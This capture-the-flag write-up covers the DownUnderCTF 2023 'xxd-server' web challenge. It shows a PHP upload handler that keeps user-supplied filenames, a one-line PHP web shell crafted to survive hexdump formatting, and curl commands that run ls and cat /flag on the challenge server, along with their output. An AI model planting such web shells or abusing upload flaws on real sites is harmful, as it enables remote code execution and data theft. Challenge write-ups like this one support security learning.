# DownUnderCTF 2023

## xxd-server

> I wrote a little app that allows you to hex dump files over the internet.
>
>  Author: hashkitten
>
> [`xxd_server.zip`](xxd_server.zip)

Tags: _web_

## Solution
For this challenge we get the code of a simple php web application:

```php
// Is there an upload?
if (isset($_FILES['file-upload'])) {
        $upload_dir = 'uploads/' . bin2hex(random_bytes(8));
        $upload_path = $upload_dir . '/' . basename($_FILES['file-upload']['name']);
        mkdir($upload_dir);
        $upload_contents = xxd(file_get_contents($_FILES['file-upload']['tmp_name']));
        if (file_put_contents($upload_path, $upload_contents)) {
                $message = 'Your file has been uploaded. Click <a href="' . htmlspecialchars($upload_path) . '">here</a> to view';
        } else {
            $message = 'File upload failed.';
        }
}
```

We can upload files. The files are then placed in the `upload` folder but the file content is written as hex-dump:

```
00000000: 4865 6c6c 6f20 576f 726c 640a            Hello World.    
```

Since we are getting a direct link to the file, we potentially could upload php code and let the server execute the code by providing `php` as file extension. The only problem is, that the hexdump will split the file content into 16 byte blocks. For this we can try to use a [`tiny web shell`](https://github.com/bayufedra/Tiny-PHP-Webshell):

```php
<?=`$_GET[0]`?>
```

With this we can execute commands and get the flag:
```bash
$ curl https://web-xxd-server-2680de9c070f.2023.ductf.dev/uploads/78fb2c4467d51be9/shell.php?0=ls
00000000: 3c3f 3d60 245f 4745 545b 305d 603f 3e0a  shell.php
.

$ curl https://web-xxd-server-2680de9c070f.2023.ductf.dev/uploads/78fb2c4467d51be9/shell.php?0=ls%20/
00000000: 3c3f 3d60 245f 4745 545b 305d 603f 3e0a  bin
boot
dev
etc
flag
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
.

$ curl https://web-xxd-server-2680de9c070f.2023.ductf.dev/uploads/78fb2c4467d51be9/shell.php?0=cat%20/flag
00000000: 3c3f 3d60 245f 4745 545b 305d 603f 3e0a  DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}.
```

Flag `DUCTF{00000000__7368_656c_6c64_5f77_6974_685f_7878_6421__shelld_with_xxd!}`